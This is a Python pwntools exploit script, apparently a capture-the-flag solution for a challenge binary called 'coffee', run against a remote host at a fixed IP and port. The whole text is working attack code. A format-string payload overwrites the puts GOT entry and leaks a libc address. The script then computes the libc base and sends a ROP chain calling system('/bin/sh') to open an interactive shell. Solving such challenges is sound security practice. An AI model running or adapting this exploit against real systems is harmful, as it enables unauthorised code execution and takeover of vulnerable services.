from pwn import *
context.binary = elf = ELF('./coffee', checksec=False)
libc = ELF('./libc.so.6', checksec=False)

s = remote('34.146.50.22', 30002)
#s = remote('localhost', 10000)
#s = process('./start.sh')

fsb = b'%4747c%11$hn'
leak = b'%29$p'
#leak = b'%22$p'

payload = fsb
payload += leak
payload += b'\x00' * (0x20-len(payload))
payload += p64(0x401196)
payload += p64(elf.got.puts)

s.sendline(payload)

s.recvuntil(b'0x')
libc.address = int(s.recv(12), 16) - libc.symbols.__libc_start_main - 243
print('libc:', hex(libc.address))

pop_rdi = 0x00401293
binsh = libc.address + 0x1b75aa

payload = b'A' * 0x20
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(libc.symbols.system)

s.sendline(payload)


s.interactive()
